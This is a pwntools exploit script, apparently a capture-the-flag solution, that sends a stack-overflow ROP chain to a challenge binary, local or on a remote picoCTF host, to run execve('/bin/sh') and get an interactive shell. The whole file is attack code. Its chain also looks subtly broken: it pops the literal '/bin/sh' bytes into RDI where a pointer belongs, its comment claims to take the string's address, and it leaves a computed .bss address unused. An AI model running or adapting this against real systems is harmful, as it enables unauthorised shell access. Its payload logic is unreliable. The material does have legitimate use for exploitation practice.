#!/usr/bin/env python3
from pwn import *

# Setup
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

BINARY = './vuln'
HOST = 'shape-facility.picoctf.net'
PORT = 61110

# very cool gadgets
POP_RDI = 0x00000000004119e2
POP_RSI = 0x0000000000400a55
POP_RDX = 0x000000000041153a
POP_RAX = 0x00000000004005af
SYSCALL = 0x000000000040138c
RET = 0x0000000000400416


def get_connection(mode):
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Use 'local' or 'remote'")
        exit(1)

def exploit(conn):
    conn = conn
    
    conn.recvuntil(b'What number would you like to guess?\n')
    conn.sendline(b"84")
    
    exe = ELF(BINARY, checksec=False)
    bss = exe.bss()
    
    offset_to_ret = 120
    
    payload = b"A" * offset_to_ret
    
    # Put "/bin/sh" on the stack and get its address
    payload += p64(POP_RDI)
    payload += b"/bin/sh\x00"               # This becomes the value popped into RDI
    payload += p64(POP_RSI) + p64(0)        # rsi = NULL
    payload += p64(POP_RDX) + p64(0)        # rdx = NULL  
    payload += p64(POP_RAX) + p64(59)       # rax = sys_execve
    payload += p64(SYSCALL)                 # execve!
    
    conn.recvuntil(b'Name? ')
    conn.sendline(payload)
    conn.recv()
    
    conn.interactive()

def main():
    import sys
    if len(sys.argv) != 2:
        log.error("Usage: python3 exploit.py [local|remote]")
        exit(1)

    conn = get_connection(sys.argv[1])
    exploit(conn)
    conn.close()

if __name__ == "__main__":
    main()
